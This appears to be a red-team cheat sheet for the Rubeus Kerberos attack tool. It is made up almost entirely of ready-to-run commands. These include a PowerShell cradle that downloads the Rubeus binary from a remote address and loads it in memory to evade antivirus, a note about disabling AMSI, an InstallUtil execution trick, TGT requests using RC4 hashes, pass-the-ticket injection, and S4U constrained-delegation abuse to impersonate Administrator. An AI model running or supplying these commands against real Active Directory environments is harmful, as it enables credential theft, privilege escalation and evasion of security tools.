# Rubeus

## Assembly Reflection

{% hint style="info" %}
Can be used to evade AV.

Disable AMSI, load the exe as Assembly and invoke the methods.
{% endhint %}

* Load the assembly using Reflection

```csharp
$ass = (new-object net.webclient).DownloadData('http://10.110.0.66/tools/rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($ass)
```

* Invoke a function

```csharp
[Rubeus.Program]::Main("purge".Split())
```

![](../../../.gitbook/assets/image%20%2839%29.png)

* Request a TGS \(Constrained Delegation\)

```csharp
[Rubeus.Program]::Main("s4u /user:server01 /rc4:sdsafgsa08ac2d2sad5988cbsda /impersonateuser:Administrator /msdsspn:cifs/server02 /ptt".Split())
```

```text
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=  /cmd="hash" /args="/password:polo" .\StandRubeus.dll
```

## Monitor for TGT

```text
rubeus.exe monitor /interval:5 /filteruser:<machine account$ or username>
```

## Inject Ticket

```csharp
.\Rubeus.exe asktgt /user:iissvc /domain:test.lab.local /rc4:FC525C9683E8FE067095BA2DDC971889
rubeus.exe ptt /ticket:Base64_ticket_here
```

## Constrained Delegation

### Create hash from password

```csharp
 .\Rubeus.exe hash /password:Passw0rd!
```

### Ask a TGT

```csharp
.\Rubeus.exe asktgt /user:iissvc /domain:test.lab.local /rc4:FC525C9683E8FE067095BA2DDC971889
```

### S4U

```text
 .\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:mssqlsvc/test.lab.local:1433 /ptt /ticket:doIE+jCCBPdsakljdkslad/lakdlsa
```

{% hint style="info" %}
altservice can also be used to the command if /msdsspn is **www.**

**/altservice:CIFS /ptt /ticket:xxxxxxxx**
{% endhint %}



